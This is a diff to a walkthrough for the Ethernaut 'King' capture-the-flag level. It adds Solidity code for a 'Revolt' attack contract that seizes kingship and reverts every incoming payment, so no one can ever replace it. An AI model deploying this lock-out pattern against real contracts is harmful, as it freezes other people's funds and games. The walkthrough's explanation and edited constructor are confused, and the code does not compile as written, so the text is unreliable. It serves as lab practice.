@@ -1,27 +1,86 @@
 #How To
 -------
+Task
+-----
+The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current 
+prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the 
+process! As ponzi as it gets xD
+Such a fun game. Your goal is to break it.
+When you submit the instance back to the level,
+the level is going to reclaim kingship. You will 
+beat the level if you can avoid such a self proclamation.
+
 
 Attacked King.sol with ClaimKing using instance level address.
 
-contract ClaimKing {
-    // King public king = King(myInstance level address);
-    
-    // malicious contract and prep with it with 1 Ether
-    constructor() public payable {
-       
-    }
-    
-    // Trigger King fallback(), set this contract as the king
-    function claim_king() public payable{
-        (bool result, bytes memory data) = address(this).call.value(msg.value)("");
-        if(!result){
-        revert();
-        }
-         address(king).call.value(1000000000000000000).gas(4000000)("");
-    }
-    
-    // Deny anyone tries to claim i.e "king.transfer" trx from Ethernaut
-     function() external payable {
-         revert("Locked out");
-     }
+//Actual contract King
+Head to Remix, create another contract with instance of contract King using player's instance address.
+The vulnerability is in the lines 4 and 5 of fallback function of King contract.
+Get the address of owner from the console using:
+    await contract.owner
+    it should return the owner's address
+Edit the actual contract King to enable you set the owner of the contract in the constructor. 
+//////////////////////////////////////////////////////////////////////////
+pragma solidity ^0.5.0;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor(// take input ==> address payable _owner) public payable {
+    owner = msg.sender;  //Edit here to owner = _owner.
+    king = msg.sender;   //Edit here to king = _owner. This lets us set the owner to the owner's address we got from the console.
+    prize = msg.value;
+  }
+
+  function() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
 }
+// create contract Revolt
+contract Revolt {
+    King public revolter = King(0x7D1471ae35485a6B195Dc7f8074bF936A78c0AA5);// Set instance address
+    
+    address payable king;
+    uint public prize;
+    address payable public owner;
+
+    // Create a malicious contract and seed it with some Ethers
+    constructor() public payable {
+        owner = msg.sender;  
+        king = msg.sender;
+        prize = msg.value;
+        address(revolter).call.value(1000000000000000000).gas(4000000)("");//Call the fallback function of contract King since we have instance
+                                                                           //of the contract. Set the gas and amount
+  }
+    function _king() public view returns (address payable) {
+    return king;
+  }
+    
+    
+    // Rejects "king.transfer" trx from Ethernaut
+    function() external payable {
+        require(msg.value >= prize || msg.sender == owner);      //check for validity
+        king.transfer(msg.value);                                //Get the ether from ethernault
+        if(msg.value >= prize || msg.sender == owner) {          //Now lock Ethernault out. When he tries to call my fallback function, I woo him.hehehe
+            revert("Hey Ethernault! I'm still king.");           //revert it immediately
+            
+        }
+        // king = msg.sender;                                    //These two lines 
+        // prize = msg.value;                                    //are the malicious guys
+    }
+}
+//////////////////////////////////////////////////////////////////////////////
+
+Now, deploy "King"
+Also, deploy Revolt.
+Go back to ethernault, submit your instance address.
